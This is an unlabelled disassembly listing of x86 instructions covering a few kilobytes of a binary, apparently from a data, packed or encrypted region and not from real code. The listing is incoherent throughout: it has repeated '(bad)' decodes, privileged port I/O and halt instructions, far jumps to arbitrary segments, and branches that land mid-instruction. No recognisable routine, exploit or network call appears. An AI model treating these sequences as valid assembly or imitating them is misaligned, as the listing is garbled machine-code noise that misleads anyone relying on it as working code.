  4165c7:	pause  
  4165c9:	aam    0xfa
  4165cb:	mov    edi,0x6f951319
  4165d0:	out    dx,eax
  4165d1:	loopne 0x41658b
  4165d3:	out    0xfb,eax
  4165d5:	fiadd  DWORD PTR [ebx]
  4165d7:	adc    BYTE PTR [esi+0x2095ee42],al
  4165dd:	hlt    
  4165de:	lods   eax,DWORD PTR ds:[esi]
  4165df:	sub    esi,ebx
  4165e1:	and    eax,0xd5ba82bc
  4165e6:	jg     0x41664f
  4165e8:	lods   al,BYTE PTR ds:[esi]
  4165e9:	mov    eax,ds:0x36870e87
  4165ee:	push   esp
  4165ef:	cmovne ecx,DWORD PTR [ebx-0x32e0303c]
  4165f6:	retf   
  4165f7:	add    dl,BYTE PTR [ebp+0x1f30b371]
  4165fd:	shr    dl,cl
  4165ff:	adc    esp,DWORD PTR [eax+edi*4-0x47463fb]
  416606:	cwde   
  416607:	outs   dx,DWORD PTR ds:[esi]
  416608:	jbe    0x416653
  41660a:	cwde   
  41660b:	jmp    0x9c9d:0xc9e20172
  416612:	pushf  
  416613:	hlt    
  416614:	jne    0x41668d
  416616:	lds    edx,FWORD PTR [edi-0xd67590e]
  41661c:	imul   ecx,DWORD PTR [edi+0x6f],0x94e67248
  416623:	hlt    
  416624:	shr    DWORD PTR [eax*1-0x260cae12],1
  41662b:	sub    eax,0xd1b7d320
  416630:	into   
  416631:	add    eax,0x8d26fe40
  416636:	pop    ss
  416637:	push   esi
  416638:	xor    eax,0xb016029d
  41663d:	mov    es,WORD PTR [ebx+0x57]
  416640:	aad    0x67
  416642:	dec    ecx
  416643:	dec    ecx
  416644:	xor    al,BYTE PTR [ecx]
  416646:	dec    edi
  416647:	sub    ch,bh
  416649:	pop    ss
  41664a:	outs   dx,BYTE PTR ds:[esi]
  41664b:	mov    cl,0x2b
  41664d:	dec    edi
  41664e:	cmp    al,0x89
  416650:	jg     0x416678
  416652:	pop    eax
  416653:	aam    0x17
  416655:	retf   0x1008
  416658:	mov    ah,0xe7
  41665a:	fwait
  41665b:	adc    eax,0x17170825
  416660:	add    al,0x7f
  416662:	adc    eax,0xfc187c8c
  416667:	stc    
  416668:	and    dh,dh
  41666a:	jecxz  0x4166d3
  41666c:	add    bl,BYTE PTR [ecx]
  41666e:	enter  0xd61c,0xf5
  416672:	adc    eax,0x4b5abe5e
  416677:	sar    DWORD PTR [edi],1
  416679:	cmp    bl,BYTE PTR [ebx]
  41667b:	and    eax,0x67
  41667e:	xlat   BYTE PTR ds:[ebx]
  41667f:	mov    edx,fs
  416681:	pop    ds
  416682:	mov    al,0xd6
  416684:	fisub  WORD PTR [esi-0x47]
  416687:	jecxz  0x41665c
  416689:	es ja  0x416624
  41668c:	stos   BYTE PTR es:[edi],al
  41668d:	loop   0x416633
  41668f:	int    0xe5
  416691:	das    
  416692:	mov    WORD PTR [ecx-0x228ca1a9],ss
  416698:	adc    eax,0xb3be27ce
  41669d:	add    BYTE PTR [ecx+ecx*8],al
  4166a0:	sbb    al,0xda
  4166a2:	sub    ebx,esi
  4166a4:	inc    edx
  4166a5:	pop    edx
  4166a6:	js     0x41667b
  4166a8:	retf   
  4166a9:	imul   edi,DWORD PTR fs:[edx-0x528b144a],0x44
  4166b1:	shl    DWORD PTR ds:0x1895870d,cl
  4166b7:	call   0x4c7f59e
  4166bc:	(bad)  
  4166bd:	jae    0x4166b1
  4166bf:	in     eax,0x66
  4166c1:	sub    esp,0xffffffe3
  4166c4:	outs   dx,BYTE PTR gs:[esi]
  4166c6:	xor    DWORD PTR [edx-0x3e],esi
  4166c9:	(bad)  
  4166ca:	mov    ds:0xaf56fb31,eax
  4166cf:	sbb    BYTE PTR [ecx+0x53],ch
  4166d2:	xchg   edi,eax
  4166d3:	adc    eax,0x26420001
  4166d8:	mov    ds:0x8f75480c,al
  4166dd:	and    WORD PTR [esi+0x23],0xffc3
  4166e2:	mov    bh,0xd7
  4166e4:	fmul   DWORD PTR [esi]
  4166e6:	pop    esi
  4166e7:	mov    ecx,0x5c855e71
  4166ec:	dec    ecx
  4166ed:	add    BYTE PTR [eax-0x43],ah
  4166f0:	pop    edx
  4166f1:	nop
  4166f2:	mov    dh,0x5e
  4166f4:	adc    al,0xc1
  4166f6:	push   0x8871a6f3
  4166fb:	or     DWORD PTR [ecx+ebx*4-0x3fad0bb4],esi
  416702:	ret    
  416703:	push   esp
  416704:	cmp    al,BYTE PTR [ecx+0x7b]
  416707:	xor    dl,bh
  416709:	ins    DWORD PTR es:[edi],dx
  41670a:	jnp    0x416718
  41670c:	loop   0x4166b7
  41670e:	xchg   edx,eax
  41670f:	mov    al,ds:0x872f05c2
  416714:	fcom   st(6)
  416716:	les    edx,FWORD PTR [edi]
  416718:	jp     0x41678f
  41671a:	les    ebp,FWORD PTR [ecx+eax*2+0x1e8c01e0]
  416721:	inc    esi
  416722:	and    BYTE PTR [ecx+0x195fc74b],ch
  416728:	int    0xe
  41672a:	lods   al,BYTE PTR ds:[esi]
  41672b:	fstp   QWORD PTR [edi]
  41672d:	mov    ds:0x7e2a8dc6,al
  416732:	push   ds
  416733:	mov    esi,0x1af15cbf
  416738:	xor    DWORD PTR ds:0xb39ae6b2,esi
  41673e:	xor    dh,BYTE PTR [ebx-0x5e]
  416741:	xchg   edx,eax
  416742:	aad    0xaf
  416744:	cld    
  416745:	loope  0x416784
  416747:	xchg   esi,eax
  416748:	jmp    0x416774
  41674a:	and    DWORD PTR [ebp+ebx*8+0x63635174],esi
  416751:	ret    0x4f91
  416754:	or     BYTE PTR [eax-0x2208b6b0],bl
  41675a:	mov    edx,?
  41675c:	add    BYTE PTR [edi+ecx*8+0x655f3c70],ah
  416763:	jb     0x41673d
  416765:	dec    ecx
  416766:	add    eax,0x8384e047
  41676b:	or     BYTE PTR [ecx],cl
  41676d:	test   al,0x1d
  41676f:	mov    ch,0xab
  416771:	mov    ch,0xd
  416773:	push   cs
  416774:	(bad)  
  416775:	ja     0x416767
  416777:	sahf   
  416778:	jle    0x416718
  41677a:	adc    DWORD PTR [eax+0x24],eax
  41677d:	adc    ebp,edx
  41677f:	push   ds
  416780:	cmp    eax,0x53181bb6
  416785:	adc    ebx,DWORD PTR [edi-0xf2c19c5]
  41678b:	iret   
  41678c:	repz dec eax
  41678e:	or     cl,ch
  416790:	jp     0x4167da
  416792:	lds    esi,FWORD PTR [eax+0x4b]
  416795:	push   esi
  416796:	cdq    
  416797:	mov    dh,0xa8
  416799:	mov    bl,dl
  41679b:	xchg   ebx,eax
  41679c:	nop
  41679d:	stc    
  41679e:	and    DWORD PTR [ecx+0x770e1cd2],0x9749f772
  4167a8:	daa    
  4167a9:	lea    ecx,ds:0xcc6cd91d
  4167af:	popf   
  4167b0:	cmp    DWORD PTR [ecx-0x7df99e61],ecx
  4167b6:	mov    ecx,0xbf559a2f
  4167bb:	mov    bh,0xab
  4167bd:	jp     0x4167aa
  4167bf:	add    ah,BYTE PTR [esp+ecx*1+0x2]
  4167c3:	hlt    
  4167c4:	xchg   BYTE PTR [ecx],dh
  4167c6:	push   ss
  4167c7:	outs   dx,BYTE PTR ds:[esi]
  4167c8:	add    ebp,ebx
  4167ca:	scas   eax,DWORD PTR es:[edi]
  4167cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167cc:	sub    DWORD PTR [ecx],ebx
  4167ce:	cdq    
  4167cf:	inc    edi
  4167d0:	fdivr  DWORD PTR [edi]
  4167d2:	fisttp QWORD PTR [edx+0x71]
  4167d5:	loope  0x4167eb
  4167d7:	adc    BYTE PTR [edx+0x40],cl
  4167da:	add    DWORD PTR [eax+0x50],0xd9acd8f6
  4167e1:	pop    esp
  4167e2:	mov    al,0xa9
  4167e4:	sub    bl,BYTE PTR [ebx+0x69829197]
  4167ea:	push   ss
  4167eb:	fist   DWORD PTR [ecx+0x67]
  4167ee:	lahf   
  4167ef:	lahf   
  4167f0:	or     eax,0x4d7e84b6
  4167f5:	in     eax,0xc9
  4167f7:	jns    0x41677a
  4167f9:	cld    
  4167fa:	sbb    al,BYTE PTR [ebx-0x8cf039c]
  416800:	inc    esi
  416801:	(bad)  
  416802:	das    
  416803:	dec    esp
  416804:	int    0x52
  416806:	jecxz  0x41681b
  416808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416809:	mov    edi,0x9690fcad
  41680e:	cmp    cl,BYTE PTR [ecx+0x4b]
  416811:	xchg   dx,ax
  416813:	cwde   
  416814:	div    BYTE PTR [ecx+0x4a]
  416817:	arpl   WORD PTR [eax+eax*1-0x73a7a90c],cx
  41681e:	dec    esi
  41681f:	std    
  416820:	xor    eax,0x2cfcf6c6
  416825:	cmp    BYTE PTR [edx-0x4b],dh
  416828:	mov    ebx,0xda756646
  41682d:	in     al,dx
  41682e:	ss push esp
  416830:	stos   DWORD PTR es:[edi],eax
  416831:	fpatan 
  416833:	imul   ecx,DWORD PTR [ebx+edi*8],0xf39f06c2
  41683a:	loope  0x416844
  41683c:	push   ds
  41683d:	xor    BYTE PTR [ebx],ah
  41683f:	xor    DWORD PTR [edi-0x2],0xfffffff6
  416843:	cwde   
  416844:	add    DWORD PTR [esp+eiz*8-0x7471e8c0],esi
  41684b:	out    0x91,eax
  41684d:	gs cdq 
  41684f:	push   ss
  416850:	ja     0x416810
  416852:	in     eax,0xca
  416854:	(bad)  
  416856:	dec    esi
  416857:	stos   BYTE PTR es:[edi],al
  416858:	xor    ebp,DWORD PTR [ebp+0x388a9d76]
  41685e:	jp     0x41681a
  416860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416861:	in     eax,0xbc
  416863:	jns    0x4168d1
  416865:	ficom  WORD PTR [ebp+0x29e26a54]
  41686b:	adc    eax,0x5df65866
  416870:	jmp    0x7f86:0x834e4e57
  416877:	cmp    ebp,DWORD PTR [edi+0x29]
  41687a:	idiv   BYTE PTR [edi+edi*4+0x7db5ab86]
  416881:	jae    0x4168e8
  416883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416884:	popa   
  416885:	xor    dh,ah
  416887:	fidivr WORD PTR ds:0xf0426572
  41688d:	add    dl,BYTE PTR [ebp+0x3a]
  416890:	in     eax,dx
  416891:	das    
  416892:	push   ds
  416893:	ds jle 0x4168e3
  416896:	stc    
  416897:	push   esp
  416898:	fwait
  416899:	(bad)  
  41689a:	fisubr DWORD PTR [esi]
  41689c:	int3   
  41689d:	lea    ebx,[edx+esi*8+0xdbfa7e5]
  4168a4:	sbb    al,0xeb
  4168a6:	loope  0x4168b7
  4168a8:	xchg   edi,eax
  4168a9:	arpl   WORD PTR [edi-0x1af236a2],dx
  4168af:	xor    BYTE PTR [esi+0x330fc981],al
  4168b5:	int    0xa6
  4168b7:	xchg   ebx,eax
  4168b8:	mov    ds:0xf27ac966,al
  4168bd:	aam    0x87
  4168bf:	ret    
  4168c0:	ja     0x4168d3
  4168c2:	mov    dl,0xdd
  4168c4:	retf   
  4168c5:	push   esi
  4168c6:	inc    edx
  4168c7:	add    eax,0xac85f056
  4168cc:	stos   DWORD PTR es:[edi],eax
  4168cd:	and    al,0xf1
  4168cf:	cmp    BYTE PTR [ebp-0x33dd7f2f],ch
  4168d5:	inc    ecx
  4168d6:	ds call 0xba0f792
  4168dc:	jns    0x416862
  4168de:	sub    dl,BYTE PTR [ecx-0x58]
  4168e1:	inc    ebp
  4168e2:	(bad)  
  4168e3:	out    0x4f,al
  4168e5:	pop    edx
  4168e6:	hlt    
  4168e7:	std    
  4168e8:	jnp    0x416937
  4168ea:	and    edx,DWORD PTR [edi]
  4168ec:	cmp    al,0x6a
  4168ee:	fdiv   DWORD PTR [ebp-0x79]
  4168f1:	push   ss
  4168f2:	cmp    esi,eax
  4168f4:	ins    BYTE PTR es:[edi],dx
  4168f5:	mov    ecx,0x2fe09ecf
  4168fa:	outs   dx,DWORD PTR ds:[esi]
  4168fb:	cmp    DWORD PTR [ebp-0x4125bb88],ecx
  416901:	cmc    
  416902:	(bad)  
  416903:	shl    BYTE PTR [ebp+ebp*8-0x40],cl
  416907:	push   ebx
  416908:	(bad)  
  416909:	iret   
  41690a:	ficom  DWORD PTR [eax-0x37414bc6]
  416910:	mov    ah,0xb5
  416912:	adc    eax,0x48f162c8
  416917:	aaa    
  416918:	mov    bh,0x4
  41691a:	dec    ebx
  41691b:	arpl   WORD PTR [ebx],si
  41691d:	(bad)  
  41691f:	xchg   ebx,eax
  416920:	sub    ch,BYTE PTR [ebx-0x26]
  416923:	fimul  WORD PTR [edi]
  416925:	(bad)  
  416926:	int    0xa6
  416928:	or     DWORD PTR [esi+edi*4],edi
  41692b:	mov    edx,0x9ee5cc9d
  416930:	outs   dx,BYTE PTR ds:[esi]
  416931:	and    BYTE PTR [ebp+0x10],dh
  416934:	mov    bh,0x9a
  416936:	fwait
  416937:	test   BYTE PTR ds:0x2aef6d77,0xf7
  41693e:	addr16 jb 0x41697a
  416941:	xchg   ebx,eax
  416942:	(bad)  
  416943:	fnstenv [ebp+0x6c]
  416946:	pushf  
  416947:	sbb    esp,DWORD PTR ds:0xa5a8d0bc
  41694d:	push   esp
  41694e:	mov    eax,ds:0x4d624bf5
  416953:	sbb    DWORD PTR [ebx],ebx
  416955:	and    BYTE PTR [esi],ch
  416957:	cmp    BYTE PTR [edx+0x4f5258d3],dh
  41695d:	and    eax,0x87fb708c
  416962:	out    dx,al
  416963:	sahf   
  416964:	or     dh,ah
  416966:	inc    edi
  416967:	popa   
  416968:	and    BYTE PTR [eax+edx*2],dl
  41696b:	stc    
  41696c:	outs   dx,BYTE PTR ds:[esi]
  41696d:	sub    ebx,eax
  41696f:	xchg   edx,eax
  416970:	neg    DWORD PTR [eax+0x178d0717]
  416976:	aam    0xb4
  416978:	or     DWORD PTR [eax-0x52bbbef],esp
  41697e:	cmp    al,ch
  416980:	cmp    edx,edx
  416982:	pop    ds
  416983:	xchg   ecx,eax
  416984:	jae    0x4169d0
  416986:	inc    edx
  416987:	fcmovb st,st(1)
  416989:	aam    0x2a
  41698b:	or     al,0x97
  41698d:	mov    ds,WORD PTR [eax]
  41698f:	add    BYTE PTR [esi+0x5c],bl
  416992:	stc    
  416993:	pop    es
  416994:	push   esp
  416995:	in     al,dx
  416996:	dec    edx
  416997:	adc    DWORD PTR [ebx+0x56],ecx
  41699a:	xchg   ecx,eax
  41699b:	cmp    DWORD PTR [ebp+0x4],esi
  41699e:	mov    edx,0xe6f033b1
  4169a3:	sbb    ebx,DWORD PTR [edx-0x5bf57b6b]
  4169a9:	mov    DWORD PTR [edx+0x22cd15f1],edi
  4169af:	scas   al,BYTE PTR es:[edi]
  4169b0:	pop    edx
  4169b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169b2:	sub    dh,BYTE PTR [ebp+ebx*1+0x47]
  4169b6:	xchg   esi,eax
  4169b7:	ror    DWORD PTR [edx-0x80],cl
  4169ba:	pop    eax
  4169bb:	mov    ds:0x127dae39,eax
  4169c0:	push   ecx
  4169c1:	push   edi
  4169c2:	inc    esi
  4169c3:	inc    ebp
  4169c4:	xchg   esp,eax
  4169c5:	and    esp,DWORD PTR [edx-0x16]
  4169c8:	cwde   
  4169c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169ca:	pop    esi
  4169cb:	gs dec ebx
  4169cd:	pop    esi
  4169ce:	push   ebp
  4169cf:	push   esp
  4169d0:	pusha  
  4169d1:	dec    ebx
  4169d2:	pop    ss
  4169d3:	outs   dx,DWORD PTR ds:[esi]
  4169d4:	inc    ebx
  4169d5:	mov    dh,0x7
  4169d7:	mov    bl,bl
  4169d9:	mov    ah,0x9d
  4169db:	mov    esp,0x59548504
  4169e0:	daa    
  4169e1:	mov    ch,0xac
  4169e3:	or     dl,BYTE PTR [edi+0x6605abf1]
  4169e9:	je     0x416a29
  4169eb:	push   cs
  4169ec:	int3   
  4169ed:	dec    esi
  4169ee:	imul   edx,ebx,0x6a570631
  4169f4:	mov    ebx,0x22e6e371
  4169f9:	adc    eax,0xaa76ec87
  4169fe:	frstor [esi+edx*4-0x7]
  416a02:	jl     0x416992
  416a04:	pop    edi
  416a05:	dec    esi
  416a06:	sbb    BYTE PTR ds:0xa614640,al
  416a0c:	repz retf 
  416a0e:	or     al,0x80
  416a10:	daa    
  416a11:	sti    
  416a12:	and    DWORD PTR [edi+0x63],esp
  416a15:	xchg   ecx,eax
  416a16:	cld    
  416a17:	popa   
  416a18:	icebp  
  416a19:	adc    eax,0xd9c5c447
  416a1e:	mov    eax,ds:0x9703a802
  416a23:	dec    esp
  416a24:	adc    DWORD PTR [ecx-0x8b53aa3],0xf1b9bf5d
  416a2e:	sbb    DWORD PTR [esi],edx
  416a30:	(bad)  
  416a31:	out    0x89,eax
  416a33:	mov    cs,WORD PTR [edx]
  416a35:	mov    eax,ds:0x9dda9cb
  416a3a:	out    dx,al
  416a3b:	jp     0x416a30
  416a3d:	jb     0x416a09
  416a3f:	aam    0xf3
  416a41:	sub    eax,0x9eabe9e3
  416a46:	scas   al,BYTE PTR es:[edi]
  416a47:	adc    DWORD PTR [edi-0x6a0fe83a],edi
  416a4d:	lods   eax,DWORD PTR ds:[esi]
  416a4e:	in     al,0x8e
  416a50:	dec    esi
  416a51:	pop    edx
  416a52:	fs inc edi
  416a54:	pop    esi
  416a55:	mov    dl,0xf4
  416a57:	jmp    0x416a80
  416a59:	sub    al,0xa5
  416a5b:	adc    eax,0x536ed8a7
  416a60:	jmp    0x8f2a:0xa27bead0
  416a67:	lahf   
  416a68:	sti    
  416a69:	sub    eax,0x37125aaf
  416a6e:	jns    0x416a24
  416a70:	mov    al,ds:0xd9342321
  416a75:	sub    eax,0xb1496f26
  416a7a:	push   eax
  416a7b:	jnp    0x416a5a
  416a7d:	or     al,0xc7
  416a7f:	add    dl,BYTE PTR [ebx+0x40a494ac]
  416a85:	fucomip st,st(4)
  416a87:	push   es
  416a88:	mov    eax,0x199fcac8
  416a8d:	mov    fs:0x651735bb,eax
  416a93:	cli    
  416a94:	dec    esp
  416a95:	dec    ebx
  416a96:	test   al,0x3a
  416a98:	cmp    DWORD PTR [ebx+0x40bff4b0],ebp
  416a9e:	popa   
  416a9f:	in     al,0xd2
  416aa1:	dec    esp
  416aa2:	(bad)  
  416aa3:	lods   al,BYTE PTR ds:[esi]
  416aa4:	dec    eax
  416aa5:	icebp  
  416aa6:	xchg   edx,eax
  416aa7:	int3   
  416aa8:	retf   0xf830
  416aab:	add    al,0x9b
  416aad:	push   ebp
  416aae:	call   0xcc69:0x8c8d26d1
  416ab5:	cwde   
  416ab6:	lea    esp,[edi-0x2888a845]
  416abc:	xor    dl,BYTE PTR [edi-0x55bbee5]
  416ac2:	call   0x857b:0x5e23502e
  416ac9:	repz pop es
  416acb:	dec    esi
  416acc:	ins    DWORD PTR es:[edi],dx
  416acd:	jl     0x416acb
  416acf:	mov    esp,0xb758768d
  416ad5:	fst    QWORD PTR [esp+edx*8-0x7e]
  416ad9:	push   ss
  416ada:	adc    esp,DWORD PTR [esi+0x71]
  416add:	ret    0x546d
  416ae0:	mov    eax,0x2d5265e5
  416ae5:	jecxz  0x416b62
  416ae7:	lods   eax,DWORD PTR ds:[esi]
  416ae8:	jnp    0x416b42
  416aea:	(bad)  
  416aeb:	adc    DWORD PTR [ecx+0x60],edx
  416aee:	test   BYTE PTR [esp+ebp*2-0x5d],bl
  416af2:	and    esi,ebp
  416af4:	sub    ebp,DWORD PTR [eax-0x16]
  416af7:	stos   DWORD PTR es:[edi],eax
  416af8:	jb     0x416aa5
  416afa:	or     BYTE PTR es:[edx+0x6e],cl
  416afe:	or     esi,eax
  416b00:	xchg   edx,eax
  416b01:	div    DWORD PTR [ebp-0x27]
  416b04:	not    DWORD PTR [esi]
  416b06:	das    
  416b07:	xchg   esi,eax
  416b08:	dec    esp
  416b09:	fs nop
  416b0b:	pop    esi
  416b0c:	jbe    0x416b53
  416b0e:	jne    0x416b71
  416b10:	popa   
  416b11:	pop    esi
  416b12:	stc    
  416b13:	js     0x416afd
  416b15:	sub    DWORD PTR [ecx+ebx*4+0x2ca05b2e],ebp
  416b1c:	xchg   ecx,eax
  416b1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b1e:	addr16 js 0x416aba
  416b21:	ins    BYTE PTR es:[edi],dx
  416b22:	outs   dx,DWORD PTR ds:[esi]
  416b23:	mul    DWORD PTR [ebp-0xf384e17]
  416b29:	cs mov esp,0x5fdc5b0c
  416b2f:	dec    esi
  416b30:	int3   
  416b31:	sbb    al,0xed
  416b33:	jle    0x416af7
  416b35:	scas   al,BYTE PTR es:[edi]
  416b36:	jge    0x416b80
  416b38:	sub    bl,BYTE PTR [edi]
  416b3a:	or     al,0x49
  416b3c:	xor    ah,BYTE PTR [eax-0x24]
  416b3f:	cwde   
  416b40:	add    eax,0x1ea8fabb
  416b45:	xor    eax,0xaed7d325
  416b4a:	pop    edx
  416b4b:	aad    0x7c
  416b4d:	inc    ecx
  416b4e:	lahf   
  416b4f:	sahf   
  416b50:	out    0x76,eax
  416b52:	mov    eax,0x17727bd3
  416b57:	pop    eax
  416b58:	(bad)  [edx+0x65]
  416b5b:	xlat   BYTE PTR ds:[ebx]
  416b5c:	push   ebp
  416b5d:	push   0xa60f3d0
  416b62:	mov    esi,DWORD PTR [ecx]
  416b64:	gs xchg ebx,eax
  416b66:	jp     0x416b37
  416b68:	push   ebp
  416b69:	cmp    al,0x8b
  416b6b:	stos   BYTE PTR es:[edi],al
  416b6c:	bound  edi,QWORD PTR [eax+0x4e]
  416b6f:	jle    0x416b16
  416b71:	hlt    
  416b72:	test   al,0xa8
  416b74:	cmp    bl,cl
  416b76:	(bad)  
  416b77:	sar    DWORD PTR [ecx-0x66965618],1
  416b7d:	cdq    
  416b7e:	(bad)  
  416b7f:	xchg   edx,eax
  416b80:	iret   
  416b81:	push   edi
  416b82:	xchg   ebp,eax
  416b83:	fdivr  st,st(0)
  416b85:	xlat   BYTE PTR ds:[ebx]
  416b86:	ret    
  416b87:	or     dl,BYTE PTR [ecx-0x36]
  416b8a:	cmp    dh,BYTE PTR [ebp+0x494517ec]
  416b90:	cmp    BYTE PTR [ebp+0x2b],0x15
  416b94:	and    eax,0xff17b4ae
  416b99:	jp     0x416bfa
  416b9b:	aad    0xfe
  416b9d:	xor    al,0xfe
  416b9f:	lea    ebp,[ebx-0xf259eed]
  416ba5:	jge    0x416bac
  416ba7:	ins    DWORD PTR es:[edi],dx
  416ba8:	imul   ebx,edx,0xc51d03cf
  416bae:	scas   al,BYTE PTR es:[edi]
  416baf:	cmp    al,0x97
  416bb1:	call   0x9b4f:0x15f90f07
  416bb8:	cmp    BYTE PTR [eax+0x2f8a56cc],al
  416bbe:	and    DWORD PTR [ebp+0x22f06c49],esi
  416bc4:	or     ah,BYTE PTR [edx+0x294a991e]
  416bca:	or     dl,BYTE PTR [esi]
  416bcc:	stos   DWORD PTR es:[edi],eax
  416bcd:	ins    BYTE PTR es:[edi],dx
  416bce:	xor    ah,ah
  416bd0:	push   esi
  416bd1:	aaa    
  416bd2:	xchg   ecx,eax
  416bd3:	fcomip st,st(4)
  416bd5:	fs js  0x416b94
  416bd8:	fsub   QWORD PTR [ecx]
  416bda:	xchg   ecx,eax
  416bdb:	idiv   BYTE PTR [edi]
  416bdd:	add    DWORD PTR [edi+eiz*8-0x449a35ff],esp
  416be4:	jp     0x416bdc
  416be6:	ss retf 
  416be8:	cwde   
  416be9:	mov    cl,0x8d
  416beb:	outs   dx,DWORD PTR ds:[esi]
  416bec:	mov    DWORD PTR [esi-0xf],0x6aeccc9f
  416bf3:	mov    eax,gs:0xa87fc379
  416bf9:	adc    ebp,eax
  416bfb:	push   ss
  416bfc:	call   0x58d23a0b
  416c01:	stc    
  416c02:	push   ebp
  416c03:	inc    ebx
  416c04:	cli    
  416c05:	pop    ss
  416c06:	stc    
  416c07:	jb     0x416bd1
  416c09:	push   edx
  416c0a:	lea    eax,ss:[ebx]
  416c0d:	or     eax,0xf640aabb
  416c12:	enter  0xf061,0xfc
  416c16:	ss (bad) 
  416c18:	xchg   esp,eax
  416c19:	jnp    0x416c12
  416c1b:	out    0xeb,al
  416c1d:	mov    eax,0x9ae0c729
  416c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c23:	cmp    ebp,eax
  416c25:	(bad)  
  416c26:	lds    ebp,FWORD PTR [ecx-0x70e494fc]
  416c2c:	adc    BYTE PTR [edx-0x49519926],dl
  416c32:	mov    ah,0x50
  416c34:	pop    ecx
  416c35:	jne    0x416c45
  416c37:	xchg   esp,eax
  416c38:	mov    WORD PTR [edx+esi*4+0x19],?
  416c3c:	hlt    
  416c3d:	xchg   edx,eax
  416c3e:	xchg   BYTE PTR [eax+0x66],bl
  416c41:	mov    edx,ecx
  416c43:	xlat   BYTE PTR ds:[ebx]
  416c44:	mov    bl,BYTE PTR ds:0xbe135f2e
  416c4a:	xor    al,0x16
  416c4c:	mov    ch,0xc8
  416c4e:	adc    BYTE PTR [ebp+0x66],0xea
  416c52:	add    edx,eax
  416c54:	fiadd  DWORD PTR [ebx+0x36677106]
  416c5a:	jo     0x416c52
  416c5c:	jge    0x416be3
  416c5e:	cs daa 
  416c60:	mov    eax,0xdf95a1d0
  416c65:	sub    ebx,edx
  416c67:	push   eax
  416c68:	mov    ah,0xcd
  416c6a:	cdq    
  416c6b:	sub    ah,0x9
  416c6e:	adc    DWORD PTR [esi],ebp
  416c70:	jb     0x416c43
  416c72:	test   DWORD PTR [esi],edx
  416c74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c75:	rcl    DWORD PTR [ebp+eax*4-0x2606863c],0xc0
  416c7d:	mov    ebx,0x907ff04
  416c82:	adc    ah,ah
  416c84:	fdivr  DWORD PTR [esi]
  416c86:	mov    eax,0x2f93ad69
  416c8b:	sbb    al,0x1d
  416c8d:	ins    BYTE PTR es:[edi],dx
  416c8e:	icebp  
  416c8f:	hlt    
  416c90:	xchg   ebx,eax
  416c91:	or     eax,edx
  416c93:	xchg   edi,eax
  416c94:	mov    ebp,0xdd64b346
  416c99:	or     al,0xd4
  416c9b:	imul   edi,DWORD PTR [esi+0x31],0xfffffff0
  416c9f:	sbb    ch,cl
  416ca1:	push   0x59
  416ca3:	ds xor ch,0xa5
  416ca7:	or     al,0xfe
  416ca9:	sar    bl,cl
  416cab:	in     al,dx
  416cac:	test   eax,0x60514b0e
  416cb1:	cmp    BYTE PTR [edi],bh
  416cb3:	add    ebp,edi
  416cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cb6:	jle    0x416c78
  416cb8:	pop    edx
  416cb9:	je     0x416d1b
  416cbb:	inc    esi
  416cbc:	sub    ebx,DWORD PTR [edx+0xf31318d]
  416cc2:	mov    ch,0xd7
  416cc4:	iret   
  416cc5:	ins    BYTE PTR es:[edi],dx
  416cc6:	inc    edx
  416cc7:	sub    BYTE PTR [ecx+edi*8-0x5a],cl
  416ccb:	sbb    eax,0x11040628
  416cd0:	or     al,BYTE PTR [esi]
  416cd2:	sbb    bh,cl
  416cd4:	imul   ecx,eax,0x9e6fe9a8
  416cda:	fisttp QWORD PTR [eax]
  416cdc:	jmp    0x416d53
  416cde:	mov    ah,0x44
  416ce0:	sahf   
  416ce1:	xchg   cl,ch
  416ce3:	cli    
  416ce4:	inc    esi
  416ce5:	aam    0x7c
  416ce7:	mov    eax,0xb7453072
  416cec:	or     BYTE PTR [esi+ebp*4-0x1f],dh
  416cf0:	xor    BYTE PTR [ebx+ebp*4],bl
  416cf3:	lea    eax,[eax]
  416cf5:	ja     0x416d48
  416cf7:	icebp  
  416cf8:	jnp    0x416d3d
  416cfa:	mov    bl,0x33
  416cfc:	test   eax,0xf4a5a833
  416d01:	jnp    0x416cc1
  416d03:	mov    ch,0xe2
  416d05:	jne    0x416cfa
  416d07:	fsubr  st,st(6)
  416d09:	sub    ecx,esi
  416d0b:	in     al,0x16
  416d0d:	xor    BYTE PTR [esi+edx*1],ch
  416d10:	in     al,dx
  416d11:	dec    esp
  416d12:	xor    BYTE PTR [esi],dl
  416d14:	add    cl,BYTE PTR [esi+eax*2+0x17]
  416d18:	push   edi
  416d19:	rcr    dl,1
  416d1b:	or     BYTE PTR [ebx],dl
  416d1d:	pushf  
  416d1e:	dec    esp
  416d1f:	std    
  416d20:	and    BYTE PTR [esi-0x22],dh
  416d23:	inc    eax
  416d24:	push   esi
  416d25:	and    bh,BYTE PTR [edx+0x3]
  416d28:	clc    
  416d29:	stc    
  416d2a:	in     eax,dx
  416d2b:	jmp    FWORD PTR [ebx+0xa]
  416d2e:	and    edx,esi
  416d30:	mov    esi,0x74808bc6
  416d35:	sub    ebx,ebx
  416d37:	mov    edx,0x9e6fd47e
  416d3c:	add    al,bh
  416d3e:	jp     0x416d35
  416d40:	ins    BYTE PTR es:[edi],dx
  416d41:	nop
  416d42:	lds    esi,FWORD PTR [esi]
  416d44:	jp     0x416d10
  416d46:	ret    
  416d47:	sub    eax,0xb154f74d
  416d4c:	cmp    cl,bl
  416d4e:	cmc    
  416d4f:	mov    dh,0xbf
  416d51:	xor    DWORD PTR [ebx-0x4cf2b02b],eax
  416d57:	jl     0x416d96
  416d59:	mov    al,BYTE PTR [edx+edi*1-0x2f245950]
  416d60:	dec    ebp
  416d61:	js     0x416d27
  416d63:	fidivr WORD PTR [ebp+0x8]
  416d66:	fld    QWORD PTR [edi-0x28]
  416d69:	xchg   BYTE PTR [ebp-0x4d806a8b],bl
  416d6f:	mov    bh,0xe2
  416d71:	es jp  0x416d0f
  416d74:	push   edi
  416d75:	ror    DWORD PTR [edx+0x5f],0x59
  416d79:	inc    edx
  416d7a:	push   edx
  416d7b:	pop    ebp
  416d7c:	pop    ebx
